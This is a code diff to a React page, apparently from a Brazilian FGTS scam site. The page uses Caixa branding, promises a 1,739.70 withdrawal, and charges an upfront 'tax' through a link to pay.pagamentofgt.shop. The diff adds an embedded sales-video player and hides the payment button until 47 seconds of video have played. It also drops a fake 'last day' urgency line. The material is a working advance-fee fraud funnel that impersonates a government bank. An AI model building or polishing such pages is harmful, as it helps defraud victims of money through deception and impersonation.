@@ -7,11 +7,52 @@ import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
 import logocaixa from "../assets/caixalogo.png"
-import dayjs from "dayjs";
+
 
 export function PagamentoTarifa() {
     const [displayedAmount, setDisplayedAmount] = useState(0);
     const saqueTotal = 1739.70;
+
+    const [isVisible, setIsVisible] = useState(false);
+
+    useEffect(() => {
+        const SECONDS_TO_DISPLAY = 47;
+
+        let attempts = 0;
+        let elsDisplayed = false;
+        const alreadyDisplayedKey = `alreadyElsDisplayed${SECONDS_TO_DISPLAY}`;
+        const alreadyElsDisplayed = localStorage.getItem(alreadyDisplayedKey);
+
+        const showHiddenElements = () => {
+            elsDisplayed = true;
+            setIsVisible(true);
+            localStorage.setItem(alreadyDisplayedKey, "true");
+        };
+
+        const startWatchVideoProgress = () => {
+            if (
+                typeof window.smartplayer === "undefined" ||
+                !(window.smartplayer.instances && window.smartplayer.instances.length)
+            ) {
+                if (attempts >= 10) return;
+                attempts += 1;
+                setTimeout(() => startWatchVideoProgress(), 1000);
+                return;
+            }
+
+            window.smartplayer.instances[0].on("timeupdate", () => {
+                if (elsDisplayed || window.smartplayer.instances[0].smartAutoPlay) return;
+                if (window.smartplayer.instances[0].video.currentTime < SECONDS_TO_DISPLAY) return;
+                showHiddenElements();
+            });
+        };
+
+        if (alreadyElsDisplayed === "true") {
+            setTimeout(() => showHiddenElements(), 100);
+        } else {
+            startWatchVideoProgress();
+        }
+    }, []);
 
     const [userData, setUserData] = useState<UserData>({
         nome: "",
@@ -63,7 +104,14 @@ export function PagamentoTarifa() {
             <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-4">
                 <h1 className="text-3xl font-bold text-gray-800">VOCÊ TEM DINHEIRO<br />PARA RECEBER</h1>
 
-                <h2 className="text-xl  text-red-600">Hoje, dia <span className="font-bold">{dayjs().format('DD/MM/YYYY')}</span> é o <span className="font-bold">último dia</span> para sacar seu FGTS </h2>
+                <span className="text-xl">ASSISTA O VÍDEO PARA ENTENDER</span>
+
+                <div className="w-full  py-4">
+                    <div dangerouslySetInnerHTML={{ __html: '<div id="vid_6729775144401b000c1505ec" style="position:relative;width:100%;padding: 56.25% 0 0;"> <img id="thumb_6729775144401b000c1505ec" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/6729775144401b000c1505ec/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_6729775144401b000c1505ec" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div>' }} />
+                    <Helmet>
+                        <script type="text/javascript" id="scr_6729775144401b000c1505ec"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/6729775144401b000c1505ec/player.js", s.async=!0,document.head.appendChild(s); </script>
+                    </Helmet>
+                </div>
 
                 {/* Informações sobre o saque disponível */}
                 <div>
@@ -94,11 +142,22 @@ export function PagamentoTarifa() {
                 </div>
 
                 {/* Botão de confirmação */}
-                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
-                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
-                        PAGAR TAXA E SACAR MEU FGTS
-                    </button>
-                </a>
+                {
+                    isVisible ? (
+                        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                            <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
+                                PAGAR TAXA E SACAR MEU FGTS
+                            </button>
+                        </a>
+                    ) :
+                        (
+
+                            <button className="bg-zinc-300 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-pulse mt-3">
+                                ASSISTA AS ORIENTAÇÕES ACIMA PARA LIBERAR
+                            </button>
+
+                        )
+                }
 
                 {/* Sessão com imagem do Pix e mensagem de justificativa */}
                 <div className="flex flex-col items-center space-y-4">
